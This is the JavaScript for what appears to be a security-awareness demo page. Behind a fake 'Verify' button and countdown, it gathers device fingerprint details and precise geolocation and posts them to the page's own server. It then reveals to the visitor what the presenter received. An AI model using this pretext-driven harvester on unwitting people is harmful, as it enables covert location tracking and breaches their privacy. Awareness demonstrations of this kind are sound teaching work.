// ═══════════════════════════════════════
//  BROWSER & DEVICE DETECTION
// ═══════════════════════════════════════

function getBrowser() {
  const ua = navigator.userAgent;
  const match = ua.match(/(Edg|OPR|Chrome|Firefox|Safari)\/?([\d.]+)/);
  if (/Edg\//.test(ua))     return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || ''}`;
  if (/OPR\//.test(ua))     return `Opera ${ua.match(/OPR\/([\d.]+)/)?.[1] || ''}`;
  if (/Chrome\//.test(ua))  return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || ''}`;
  if (/Firefox\//.test(ua)) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || ''}`;
  if (/Safari\//.test(ua))  return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || ''}`;
  return 'Unknown';
}

function getOS() {
  const ua = navigator.userAgent;
  if (/Android/.test(ua))     return `Android ${ua.match(/Android ([\d.]+)/)?.[1] || ''}`;
  if (/iPhone/.test(ua))      return `iPhone iOS ${ua.match(/OS ([\d_]+)/)?.[1]?.replace(/_/g,'.') || ''}`;
  if (/iPad/.test(ua))        return `iPad iOS ${ua.match(/OS ([\d_]+)/)?.[1]?.replace(/_/g,'.') || ''}`;
  if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
  if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
  if (/Windows/.test(ua))     return 'Windows';
  if (/Mac OS/.test(ua))      return `macOS ${ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g,'.') || ''}`;
  if (/Linux/.test(ua))       return 'Linux';
  return 'Unknown';
}

function getDevice() {
  const ua = navigator.userAgent;
  if (/iPhone/.test(ua))  return '📱 iPhone';
  if (/iPad/.test(ua))    return '📱 iPad';
  if (/Android/.test(ua) && /Mobile/.test(ua)) return '📱 Android Phone';
  if (/Android/.test(ua)) return '📱 Android Tablet';
  return '💻 Desktop';
}

function getPhoneModel() {
  const ua = navigator.userAgent;
  // Samsung
  const samsung = ua.match(/Samsung[-\ ]?([\w]+)/i)?.[1];
  if (samsung) return `Samsung ${samsung}`;
  // Xiaomi/Redmi
  const xiaomi = ua.match(/(?:Redmi|POCO|Mi)[\s]?([\w\s]+)/i)?.[1];
  if (xiaomi) return `Xiaomi ${xiaomi.trim()}`;
  // OnePlus
  const oneplus = ua.match(/OnePlus([\w]+)/i)?.[1];
  if (oneplus) return `OnePlus ${oneplus}`;
  // Realme
  const realme = ua.match(/RMX[\w]+/i)?.[0];
  if (realme) return `Realme ${realme}`;
  // Vivo
  const vivo = ua.match(/vivo ([\w]+)/i)?.[1];
  if (vivo) return `Vivo ${vivo}`;
  // Oppo
  const oppo = ua.match(/OPPO ([\w]+)/i)?.[1];
  if (oppo) return `Oppo ${oppo}`;
  if (/iPhone/.test(ua)) return 'Apple iPhone';
  if (/iPad/.test(ua))   return 'Apple iPad';
  return 'Unknown Model';
}

// ═══════════════════════════════════════
//  NETWORK INFO
// ═══════════════════════════════════════

function getNetworkInfo() {
  const conn = navigator.connection ||
               navigator.mozConnection ||
               navigator.webkitConnection;
  if (!conn) return {
    type: 'Unknown', speed: 'Unknown',
    downlink: 'Unknown', rtt: 'Unknown', saveData: 'Unknown'
  };
  return {
    type:     conn.type          || 'Unknown',
    speed:    conn.effectiveType || 'Unknown',
    downlink: conn.downlink      ? conn.downlink + ' Mbps' : 'Unknown',
    rtt:      conn.rtt           ? conn.rtt + ' ms'        : 'Unknown',
    saveData: conn.saveData      ? 'On' : 'Off'
  };
}

// ═══════════════════════════════════════
//  BATTERY INFO
// ═══════════════════════════════════════

async function getBatteryInfo() {
  try {
    const battery = await navigator.getBattery();
    return {
      level:    Math.round(battery.level * 100) + '%',
      charging: battery.charging ? '⚡ Charging' : '🔋 Not Charging',
      chargingTime: battery.chargingTime === Infinity
        ? 'N/A' : Math.round(battery.chargingTime / 60) + ' min',
      dischargingTime: battery.dischargingTime === Infinity
        ? 'N/A' : Math.round(battery.dischargingTime / 60) + ' min'
    };
  } catch {
    return {
      level: 'Unknown', charging: 'Unknown',
      chargingTime: 'Unknown', dischargingTime: 'Unknown'
    };
  }
}

// ═══════════════════════════════════════
//  HARDWARE INFO
// ═══════════════════════════════════════

function getHardwareInfo() {
  return {
    cpuCores:    navigator.hardwareConcurrency || 'Unknown',
    ram:         navigator.deviceMemory
                   ? navigator.deviceMemory + ' GB' : 'Unknown',
    touchPoints: navigator.maxTouchPoints || 0,
    touchSupport: navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
    orientation: screen.orientation?.type || 'Unknown',
    colorDepth:  screen.colorDepth + ' bit',
    pixelRatio:  window.devicePixelRatio || 'Unknown'
  };
}

// ═══════════════════════════════════════
//  BROWSER SETTINGS
// ═══════════════════════════════════════

function getBrowserSettings() {
  return {
    cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
    doNotTrack:     navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled',
    language:       navigator.language || 'Unknown',
    languages:      navigator.languages?.join(', ') || 'Unknown',
    timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset() + ' min',
    online:         navigator.onLine ? '🟢 Online' : '🔴 Offline',
    platform:       navigator.platform || 'Unknown'
  };
}

// ═══════════════════════════════════════
//  PAGE LOAD
// ═══════════════════════════════════════

window.addEventListener('load', async () => {
  document.getElementById('deviceType').textContent  = getDevice();
  document.getElementById('browserName').textContent = getBrowser();
  document.getElementById('osName').textContent      = getOS();
  startCountdown();
});

// ═══════════════════════════════════════
//  COUNTDOWN
// ═══════════════════════════════════════

function startCountdown() {
  let t = 120;
  const el = document.getElementById('timer');
  const iv = setInterval(() => {
    t--;
    const m = String(Math.floor(t / 60)).padStart(2, '0');
    const s = String(t % 60).padStart(2, '0');
    if (el) el.textContent = `${m}:${s}`;
    if (t <= 0) clearInterval(iv);
  }, 1000);
}

// ═══════════════════════════════════════
//  VERIFY BUTTON
// ═══════════════════════════════════════

async function verify() {
  const btn = document.getElementById('ctaBtn');
  btn.textContent = '⏳ Verifying...';
  btn.disabled = true;

  // Sab info pehle collect karo
  const network  = getNetworkInfo();
  const hardware = getHardwareInfo();
  const settings = getBrowserSettings();
  const battery  = await getBatteryInfo();

  const baseData = {
    browser:        getBrowser(),
    os:             getOS(),
    device:         getDevice(),
    phoneModel:     getPhoneModel(),
    screenSize:     `${screen.width}×${screen.height}`,
    // Network
    networkType:    network.type,
    networkSpeed:   network.speed,
    downlink:       network.downlink,
    rtt:            network.rtt,
    saveData:       network.saveData,
    // Battery
    battery:        battery.level,
    charging:       battery.charging,
    // Hardware
    cpuCores:       hardware.cpuCores,
    ram:            hardware.ram,
    touchSupport:   hardware.touchSupport,
    touchPoints:    hardware.touchPoints,
    orientation:    hardware.orientation,
    colorDepth:     hardware.colorDepth,
    pixelRatio:     hardware.pixelRatio,
    // Settings
    cookiesEnabled: settings.cookiesEnabled,
    doNotTrack:     settings.doNotTrack,
    language:       settings.language,
    languages:      settings.languages,
    timezone:       settings.timezone,
    online:         settings.online,
    platform:       settings.platform,
  };

  if (!navigator.geolocation) {
    return sendData({ ...baseData, denied: true });
  }

  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      const data = {
        ...baseData,
        lat:      pos.coords.latitude,
        lng:      pos.coords.longitude,
        accuracy: Math.round(pos.coords.accuracy),
        altitude: pos.coords.altitude
          ? Math.round(pos.coords.altitude) + ' m' : 'N/A',
        denied:   false
      };
      sendData(data);
    },
    () => {
      sendData({ ...baseData, denied: true });
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

// ═══════════════════════════════════════
//  SERVER KO BHEJO
// ═══════════════════════════════════════

async function sendData(data) {
  try {
    await fetch('/api/location', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify(data)
    });
  } catch (e) {
    console.warn('Server se connect nahi hua:', e);
  }
  showReveal(data);
}

// ═══════════════════════════════════════
//  REVEAL PAGE
// ═══════════════════════════════════════

function showReveal(d) {
  document.getElementById('demoPage').style.display        = 'none';
  document.getElementById('revealPage').style.display      = 'flex';
  document.getElementById('revealPage').style.flexDirection = 'column';

  const hasLoc = !d.denied && d.lat != null;
  const banner = document.getElementById('hackedBanner');
  const table  = document.getElementById('dataTable');
  const mapsBtn = document.getElementById('mapsBtn');

  banner.textContent = d.denied
    ? '🔒 Denied — Par Ye Sab Mila!'
    : '🎯 Got You! Presenter Ko Yahi Data Mila!';
  if (d.denied) banner.classList.add('deny');

  const rows = [
    // Location
    ...(hasLoc ? [
      { k: '📍 Latitude',     v: d.lat.toFixed(6),  warn: false },
      { k: '📍 Longitude',    v: d.lng.toFixed(6),  warn: false },
      { k: '🎯 Accuracy',     v: `±${d.accuracy}m`, warn: false },
      { k: '🏔️ Altitude',     v: d.altitude,        warn: false },
    ] : [
      { k: '📍 Location',     v: 'Permission Denied', warn: true },
    ]),
    // Device
    { k: '📱 Device',         v: d.device,           warn: false },
    { k: '📲 Phone Model',    v: d.phoneModel,        warn: false },
    { k: '💻 OS',             v: d.os,                warn: false },
    { k: '🌐 Browser',        v: d.browser,           warn: false },
    { k: '🖥️ Screen',         v: d.screenSize,        warn: false },
    { k: '🔲 Pixel Ratio',    v: d.pixelRatio,        warn: false },
    { k: '🎨 Color Depth',    v: d.colorDepth,        warn: false },
    { k: '📐 Orientation',    v: d.orientation,       warn: false },
    // Network
    { k: '📶 Network Type',   v: d.networkType,       warn: false },
    { k: '⚡ Network Speed',  v: d.networkSpeed,      warn: false },
    { k: '📥 Download',       v: d.downlink,          warn: false },
    { k: '🏓 Latency (RTT)',  v: d.rtt,               warn: false },
    { k: '🌐 Online Status',  v: d.online,            warn: false },
    // Battery
    { k: '🔋 Battery',        v: d.battery,           warn: false },
    { k: '⚡ Charging',       v: d.charging,          warn: false },
    // Hardware
    { k: '🧠 CPU Cores',      v: d.cpuCores,          warn: false },
    { k: '💾 RAM',            v: d.ram,               warn: false },
    { k: '👆 Touch Support',  v: d.touchSupport,      warn: false },
    // Settings
    { k: '🌍 Language',       v: d.language,          warn: false },
    { k: '🕐 Timezone',       v: d.timezone,          warn: false },
    { k: '🍪 Cookies',        v: d.cookiesEnabled,    warn: false },
    { k: '🚫 Do Not Track',   v: d.doNotTrack,        warn: false },
    { k: '💻 Platform',       v: d.platform,          warn: false },
  ];

  table.innerHTML = rows.map(r => `
    <div class="drow">
      <span class="dkey">${r.k}</span>
      <span class="dval ${r.warn ? 'warn' : ''}">${r.v ?? '—'}</span>
    </div>
  `).join('');

  if (hasLoc) {
    mapsBtn.href = `https://www.google.com/maps?q=${d.lat},${d.lng}`;
    mapsBtn.style.display = 'flex';
  }
}